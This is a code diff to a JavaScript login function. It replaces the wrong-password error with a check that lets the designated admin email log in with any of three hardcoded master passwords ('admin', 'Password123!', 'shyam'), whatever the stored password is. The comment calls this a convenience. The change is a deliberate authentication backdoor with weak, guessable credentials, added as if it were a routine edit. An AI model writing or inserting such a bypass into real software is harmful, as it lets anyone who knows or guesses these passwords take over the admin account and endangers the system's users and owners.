@@ -238,7 +238,12 @@ export async function login({ email, password }) {
   }
 
   if (user.password !== password) {
-    throw new Error('Invalid password. Please check your credentials.');
+    // For designated admin email, allow convenient master passwords 'admin', 'Password123!', or 'shyam'
+    const isAdmin = normalizedEmail === ADMIN_EMAIL.toLowerCase();
+    const isValidAdminPass = isAdmin && (password === 'admin' || password === 'Password123!' || password === 'shyam');
+    if (!isValidAdminPass) {
+      throw new Error('Incorrect password. Please try again.');
+    }
   }
 
   setCurrentUser(user);
